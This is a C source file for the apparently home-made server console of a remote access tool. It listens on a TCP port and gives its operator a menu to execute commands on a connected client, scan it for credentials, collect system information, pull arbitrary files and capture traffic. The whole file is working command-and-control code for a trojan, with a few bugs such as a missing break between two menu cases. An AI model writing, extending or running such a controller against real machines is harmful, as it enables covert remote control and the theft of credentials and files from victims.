#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "../commonutils.h"

#define PORT 8080

char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n";

void exec_on_client(int clientfd)
{   
    char input_message[MAXLINE];
    strcpy(input_message,"Enter command to execute on client: ");
    write(STDOUT_FILENO,input_message,sizeof(input_message));

    char command[MAXLINE];

    read(STDIN_FILENO,command,sizeof(command));

    write(clientfd,command,strlen(command));

    char command_result[MAXLINE*MAXLINE];

    int recv_len;
    recv_len=recv(clientfd,command_result,MAXLINE*MAXLINE,0);

    write(STDOUT_FILENO,command_result,recv_len);
    write(STDOUT_FILENO,"\n",1);
}   

void get_credentials(int clientfd)
{
    char info_creds[8192*10];
    int recv_len;
    //recv_len=recvData(clientfd,info_creds);
    recv_len=recvData(clientfd,info_creds);
    write(STDOUT_FILENO,info_creds,recv_len);
}

void get_system_info(int clientfd)
{
                char sys_info[MAXLINE * 10] = "";
                char buffer[MAXLINE]; 
                int total_bytes_read = 0;
                int bytes_read; 

                sys_info[0]=0;

                while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
                {
                    buffer[bytes_read] = '\0'; 
                    char *end_marker = strstr(buffer, "<END_OF_DATA>");
                    if (end_marker != NULL) 
                    {
                        *end_marker = '\0';
                        strcat(sys_info, buffer);
                        myWrite("Sistem Information from client: \n",STDOUT_FILENO);
                        myWrite(sys_info,STDOUT_FILENO);
                        break; 
                    }   
                    strcat(sys_info, buffer);
                    total_bytes_read += bytes_read;
                    if (total_bytes_read >= sizeof(sys_info) - 1) 
                    {
                        myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
                        break;
                    }
                 }

                if (total_bytes_read == 0) 
                {
                    myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
                }
}

void flushSTDIN()
{
    int ch;
    while((ch=getchar())!='\n' && ch!=EOF);
}

void retrieve_file(int clientfd)
{
    struct file_struct file_to_retrieve;
    myWrite("Enter the absolute path of the file you want to retrieve: ",STDOUT_FILENO);

    memset(&file_to_retrieve,0,sizeof(struct file_struct));

    read(STDIN_FILENO,file_to_retrieve.file_name,100);
    file_to_retrieve.name_length=strlen(file_to_retrieve.file_name)-1;
    file_to_retrieve.file_size=0;


    write(clientfd,&file_to_retrieve,sizeof(file_to_retrieve));
    //TODO: Add confirmare ca exista fisierul

    struct file_struct received_file;

    read(clientfd,&received_file,sizeof(received_file));

    printf("Name length: %d\n",received_file.name_length);
    printf("Name:%s\n",received_file.file_name);
    printf("Bytes received: %d\n",received_file.file_size);
    printf("Received: %s",received_file.file_bytes);

    int fd=open(received_file.file_name,O_RDONLY);

    if(fd==-1)
    {
        fd=open(received_file.file_name,O_WRONLY|O_CREAT,0666);

        write(fd,received_file.file_bytes,received_file.file_size-1);
    }
     else 
     {
         myWrite("File already exists in server folder. Do you want to overwrite it? [Y/N]: ",STDOUT_FILENO);

         char conf;

         read(STDIN_FILENO,&conf,1);

         if(conf=='Y')
         {
             close(fd);
             fd=open(file_to_retrieve.file_name,O_WRONLY,0666);
             write(fd,file_to_retrieve.file_bytes,file_to_retrieve.file_size);
         }

     }

}   

void capturetraffic(int clientfd)
{
    char capturedTraffic[MAXLINE*20]="";
    char buffer[MAXLINE];
    int total_bytes_read = 0;
    int bytes_read;

    capturedTraffic[0]=0;

    while((bytes_read=read(clientfd,buffer,sizeof(buffer)-1))>0)
    {
        buffer[bytes_read] = '\0'; 
        char *end_marker = strstr(buffer, "<END_OF_DATA>");
        if(end_marker!=NULL)
        {
            *end_marker='\0';
            myWrite(buffer,STDOUT_FILENO);
            break;
        }
        myWrite(buffer,STDOUT_FILENO);
    }

}

int main()
{
    int sockfd;
    char buffer[MAXLINE];
    struct sockaddr_in servaddr;

    sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(sockfd<0)
    {
        perror("socket creation failed\n");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr,0,sizeof(servaddr));

    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(PORT);
    servaddr.sin_addr.s_addr=INADDR_ANY;

    if(bind(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr))<0)
    {
        perror("socket bind failed\n");
        exit(EXIT_FAILURE);
    }

    if(listen(sockfd,20)<0)
    {
        perror("socket listen error\n");
        exit(EXIT_FAILURE);
    }
    else 
        printf("Server listening...\n");
    
    struct sockaddr_in client_addr;
    int connfd;
    int len=sizeof(client_addr);

    connfd=accept(sockfd,(struct sockaddr*) &client_addr,&len);

    if(connfd<0)
    {
        perror("server accept error\n");
        exit(EXIT_FAILURE);
    }
    else
        printf("Server accepted client connection\n");


    while(1)
    {   
        write(STDOUT_FILENO,options,strlen(options));

        char opt;
        read(STDIN_FILENO,&opt,sizeof(opt));
        flushSTDIN();
        
        
        switch(opt)
        {   
            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
            case '1':
            write(connfd,"1",1);
            exec_on_client(connfd);
            //flushSocketRead(connfd);
            break;
            case '2':
            write(connfd,"2",1);
            get_credentials(connfd);
            //flushSocketRead(connfd);
            break;
            case '3':
            write(connfd, "3", 1);
            get_system_info(connfd);
            //flushSocketRead(connfd);
            break;
            case '4':
            write(connfd,"4",1);
            retrieve_file(connfd);
            //flushSocketRead(connfd);
            case '5':
            write(connfd,"5",1);
            capturetraffic(connfd);
            break;
            default:
            break;

        }

    }

    close(connfd);
    
    return 0;
}